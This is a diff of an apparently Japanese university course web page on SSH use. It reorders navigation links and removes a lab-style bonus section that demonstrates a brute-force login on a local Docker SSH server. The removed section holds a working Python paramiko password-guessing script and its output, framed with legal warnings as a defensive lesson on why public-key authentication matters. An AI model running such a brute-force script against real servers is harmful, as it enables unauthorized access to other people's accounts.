@@ -9,8 +9,10 @@
       
       
       
-        <link rel="prev" href="../559servers/">
+        <link rel="prev" href="../VPN/">
       
+      
+        <link rel="next" href="../559servers/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -742,27 +744,6 @@
                 
   
   
-  
-  
-    <li class="md-nav__item">
-      <a href="../559servers/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    559について(2024.4)
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
     
   
   
@@ -820,28 +801,52 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#ssh" class="md-nav__link">
-    <span class="md-ellipsis">
-      おまけ：パスワード認証SSHサーバーに対するサイバー攻撃
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      サイバーセキュリティに興味を持ってくれた方へ
-    </span>
-  </a>
-  
-</li>
-      
     </ul>
   
 </nav>
       
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../559servers/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    559について(2024.4)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cyberattack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    サイバー攻撃
+  </span>
+  
+
+      </a>
     </li>
   
 
@@ -889,24 +894,6 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#ssh" class="md-nav__link">
-    <span class="md-ellipsis">
-      おまけ：パスワード認証SSHサーバーに対するサイバー攻撃
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      サイバーセキュリティに興味を持ってくれた方へ
-    </span>
-  </a>
-  
-</li>
-      
     </ul>
   
 </nav>
@@ -936,240 +923,8 @@
 次に、<code>/home0/akutagawa2024/kadai.txt</code>をSCPコマンドを用いて自分のノートPCに転送してください。<br />
 そして、書かれている課題に対する答えを、doverの<code>/home0/akutagawa2024/submit</code>ディレクトリに送ってください。<br />
 ファイルの名前は、<code>アカウント名.txt</code>でお願いします。4月中に提出してください。  </p>
-<h2 id="ssh">おまけ：パスワード認証SSHサーバーに対するサイバー攻撃</h2>
-<p>公開鍵認証の大切さを知るために、パスワード認証が採用されているログインサーバーへのサイバー攻撃の流れを見ていきましょう。</p>
-<p>実際に取り組めるようにしているので、余裕のある方はハッカー(正確にはクラッカー)になったつもりでやってみてください。Codespaceで行うのが楽かなと思います。<br />
-かなり都合の良い展開が続きますが、それは上手くいくようにわざとセットしたからです。<br />
-ここでのシナリオはシンプルなものであり、現実はもっと複雑で高度な攻撃が行われています。</p>
-<div class="admonition warning">
-<p class="admonition-title">Warning</p>
-<p><span style="color: red; ">
-許可無く他人のサーバーに以下の内容を行うことは、決して許されません。  <br />
-サイバーセキュリティ基本法・不正アクセス禁止法・電子署名法などに触れる恐れがあります。<br />
-また、電子計算機使用詐欺罪・電子計算機損害等業務妨害罪などに該当する可能性もあります。<br />
-このことをよく理解した上で、続きをお楽しみください。
-</span></p>
-</div>
 <hr />
-<p>ログインサーバー(559で言うところのdover)へ遠隔ログインを試みます。<br />
-この際、あなたはOSINT等によりアカウント名「chibutsu」が存在することは把握できたものの、本人ではないためパスワードは分かりません。
-つまり、これから不正ログインをしようとしているわけです。<br />
-どのようにパスワードを入手しますか？　まずは自分で考えてみてください。  </p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>今回は計算機演習の授業なので、コンピュータ内で完結する手法の1つを紹介します。<br />
-心理学的な攻撃が気になる方は、「ソーシャルエンジニアリング」で検索してみてください。</p>
-</div>
-<p>今回は、dockerコンテナを用いて仮想的なログインサーバーを作り、それを攻撃します。 <br />
-自分のPCにdockerをインストールするか、Codespaceを使ってください。559のMac miniにはインストールされていません。</p>
-<hr />
-<p>以下、Codespaceで行う場合の手順です。<br />
-まずは、<code>/workspaces/ubuntu-22.04/remote_access</code>に移動して、docker_setup.shを実行してください。少し時間がかかります。
-<div class="highlight" style="background: #0d1117"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">1</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">2</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">3</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">4</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">5</span></pre></div></td><td class="code"><div><pre style="line-height: 125%;"><span></span><code>$ cd /workspaces/ubuntu-22.04/remote_access
-
-# 権限を要求された場合
-$ chmod 700 docker_setup.sh
-$ ./docker_setup.sh
-</code></pre></div></td></tr></table></div>
-上手くいけば、以下のようなメッセージが表示されるはずです。
-<div class="highlight" style="background: #0d1117"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">1</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">2</span></pre></div></td><td class="code"><div><pre style="line-height: 125%;"><span></span><code>dockerコンテナの準備が完了しました。
-&#39;ssh ユーザー名@localhost -p 22222&#39;でSSHログインができます。
-</code></pre></div></td></tr></table></div></p>
-<p>試しにSSHしてみましょう。パスワードは今のところ分からないはずなので、適当に入力してください。
-<div class="highlight" style="background: #0d1117"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 1</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 2</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 3</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 4</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 5</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 6</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 7</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 8</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 9</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">10</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">11</span></pre></div></td><td class="code"><div><pre style="line-height: 125%;"><span></span><code>$ ssh chibutsu@localhost -p 22222
-The authenticity of host &#39;[localhost]:22222 ([::1]:22222)&#39; can&#39;t be established.
-ECDSA key fingerprint is SHA256:7CsZMUdMUJCx9qX89ZxRaUj2s8u8MBnuB2NUFZK+W4A.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#39;[localhost]:22222&#39; (ECDSA) to the list of known hosts.
-chibutsu@localhost&#39;s password: 
-Permission denied, please try again.
-chibutsu@localhost&#39;s password: 
-Permission denied, please try again.
-chibutsu@localhost&#39;s password: 
-chibutsu@localhost: Permission denied (publickey,password).
-</code></pre></div></td></tr></table></div>
-当たり前ですが、パスワードが分からないのでログインできません。</p>
-<hr />
-<p>今回はブルートフォース攻撃(総当たり攻撃)をやってみようと思います。あり得そうなパスワードのリストを片っ端から試す攻撃手法です。  </p>
-<p>調査の結果、「chibutsu」さんは東京大学の地球惑星物理学科に所属する学生であることが分かりました。
-主に固体地球・大気海洋・宇宙惑星が好きな学生が所属する機関らしいです。<br />
-この情報を元に、ChatGPTにパスワードリストを作成してもらい、passwords.txtに保存しました。このテキストファイルを開いて、中身を見てみてください。地物っぽい単語が並んでいると思います。</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>ChatGPTの有効な活用の仕方については、「プロンプトエンジニアリング」で検索してみてください。<br />
-書籍も数多く出版されていますが、ピンキリです。</p>
-</div>
-<p>それでは、このパスワードリストを用いてSSHログインを試しましょう。<br />
-シェルスクリプトで攻撃コードを組むのは地味に大変なので、今回はPythonで組みました。<br />
-理解できなくても良いので、bruteforce_ssh.pyを眺めてみてください。Pythonの授業が終わる頃には、何をしているかなんとなく分かるようになっているはずです。 </p>
-<div class="highlight" style="background: #0d1117"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 1</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 2</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 3</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 4</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 5</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 6</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 7</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 8</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 9</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">10</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">11</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">12</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">13</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">14</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">15</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">16</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">17</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">18</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">19</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">20</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">21</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">22</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">23</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">24</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">25</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">26</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">27</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">28</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">29</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">30</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">31</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">32</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">33</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">34</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">35</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">36</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">37</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">38</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">39</span></pre></div></td><td class="code"><div><pre style="line-height: 125%;"><span></span><code># bruteforce_ssh.py
-
-import paramiko 
-import time
-import sys
-
-
-passwords_path = &quot;passwords.txt&quot; # パスワードリストの場所
-
-# ssh ユーザー名@localhost -p 22222
-HOST = &quot;localhost&quot; # SSH接続先
-PORT = 22222 # SSH接続のためのポート番号。今回は22222。
-USER = &quot;chibutsu&quot; # ユーザー名
-
-# パスワードリストからパスワードを読み込んでSSH接続を試みる。
-# 接続が成功したらプログラムを終了させる。
-# 失敗したら次のパスワードを試す。
-with open(passwords_path, &quot;r&quot;) as file:
-
-    for PASSWORD in file:
-
-        # 改行コードを取り除く
-        PASSWORD = PASSWORD.replace(&quot;\n&quot;, &quot;&quot;)
-
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        try:
-            ssh.connect(hostname=HOST, port=PORT, username=USER, password=PASSWORD)
-            print()
-            print(&quot;SUCCESS!&quot;)
-            print(f&quot;username : {USER}&quot;)
-            print(f&quot;password : {PASSWORD}&quot;)
-
-            sys.exit()
-        except paramiko.AuthenticationException:
-            print(f&quot;{PASSWORD} is not correct&quot;)
-        finally:
-            ssh.close()
-</code></pre></div></td></tr></table></div>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>paramikoというライブラリが必要です。<code>pip install paramiko</code>でインストールしてください。</p>
-</div>
-<p>このコードを実行した結果、パスワードが奇跡的に判明しました。
-<div class="highlight" style="background: #0d1117"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 1</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 2</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 3</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 4</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 5</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 6</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 7</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 8</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 9</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">10</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">11</span></pre></div></td><td class="code"><div><pre style="line-height: 125%;"><span></span><code>$ python bruteforce_ssh.py 
-earth is not correct
-planet is not correct
-physics is not correct
-...
-tornado is not correct
-storm is not correct
-
-SUCCESS!
-username : chibutsu
-password : aurora
-</code></pre></div></td></tr></table></div></p>
-<p>早速パスワードを用いて、SSHログインを試みます。
-<div class="highlight" style="background: #0d1117"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 1</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 2</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 3</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 4</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 5</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 6</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 7</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 8</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;"> 9</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">10</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">11</span>
-<span style="color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px;">12</span></pre></div></td><td class="code"><div><pre style="line-height: 125%;"><span></span><code>$ ssh chibutsu@localhost -p 22222
-chibutsu@localhost&#39;s password:  # &quot;aurora&quot;と入力
-Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 6.5.0-1017-azure x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-This system has been minimized by removing packages and content that are
-not required on a system that users do not log into.
-
-To restore this content, you can run the &#39;unminimize&#39; command.
-chibutsu@960522125acf:~$ 
-</code></pre></div></td></tr></table></div></p>
-<p>これで不正ログイン完了です。「chibutsu」さんになりすますことができました。<br />
-「chibutsu」を自分のアカウント名に置き換えて考えれば、この状況の深刻さが分かっていただけるかと思います。</p>
-<p>ここからは権限昇格を狙う(管理者権限を取得する)・バックドアを仕込む(次から簡単にログインできるようにする)・機密ファイルを転送する等がありますが、これ以上は行いません。  </p>
-<p>ここまでお付き合いいただきありがとうございました。</p>
-<p><span style="color: red; ">
-    改めて、いかなる理由があろうともサイバー攻撃は犯罪です。興味本位で行ってはいけません。
-    </span></p>
-<hr />
-<p>公開鍵認証って大事なんだな、と思っていただけた方は是非とも設定してください。<br />
-<a href="../SSH/">SSHのページ</a></p>
-<hr />
-<h2 id="_3">サイバーセキュリティに興味を持ってくれた方へ</h2>
-<p>実践することをメインにした書籍を中心に、何冊か紹介します。
-全部読んだことがあるわけではありませんが、きっと楽しめる本です。<br />
-帰り際に書籍部や図書館で見てみてはいかかでしょうか？</p>
-<ul>
-<li>ハッキング・ラボのつくりかた 完全版 仮想環境におけるハッカー体験学習</li>
-<li>体系的に学ぶ安全なWebアプリケーションの作り方 第2版 脆弱性が生まれる原理と対策の実践</li>
-<li>実践 bashによるサイバーセキュリティ対策 セキュリティ技術者のためのシェルスクリプト活用術</li>
-<li>セキュリティエンジニアのための機械学習 AI技術によるサイバーセキュリティ対策入門</li>
-<li>詳解セキュリティコンテスト CTFで学ぶ脆弱性攻略の技術</li>
-<li>ソーシャル・エンジニアリング 最大の弱点“人間”をハッカーの魔の手から守るには</li>
-</ul>
+<p>余裕のある方は、<a href="../cyberattack/">サイバー攻撃のページ</a>に進んでください。</p>
 
 
 
